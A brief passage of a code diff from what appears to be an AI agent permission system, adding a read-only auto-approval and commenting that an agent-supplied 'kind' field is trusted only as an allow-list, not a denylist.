+        return ToolHookResult.auto_approve(read_only=True)
     # Trust the SEMANTIC kind, as an ALLOW-list. ``kind`` is passed through
     # verbatim from the ACP ``kind`` field (``acp/_dispatch_parts/permission_requests.py``),
     # so it is an arbitrary agent-influenced string and a DENYLIST of mutating kinds can never
